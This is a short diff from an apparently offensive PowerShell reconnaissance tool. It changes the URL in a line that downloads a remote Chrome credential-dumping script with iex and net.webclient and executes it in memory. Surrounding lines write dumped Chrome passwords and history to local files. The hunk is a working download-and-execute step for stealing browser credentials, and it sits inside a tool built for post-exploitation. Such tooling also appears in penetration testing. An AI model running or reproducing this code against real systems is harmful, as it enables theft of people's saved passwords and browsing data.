@@ -449,7 +449,7 @@ function localreconmodules
             $chrome = Read-Host -Prompt 'Dump Chrome Browser history and maybe passwords? (yes/no)'
             if ($chrome -eq "yes" -or $chrome -eq "y" -or $chrome -eq "Yes" -or $chrome -eq "Y")
             {
-                iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/Get-ChromeDump.ps1')
+                iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/Get-ChromeDump.ps1')
                 Install-SqlLiteAssembly
                 Get-ChromeDump >> "$currentPath\LocalRecon\Chrome_Credentials.txt"
                 Get-ChromeHistory >> "$currentPath\LocalRecon\ChromeHistory.txt"
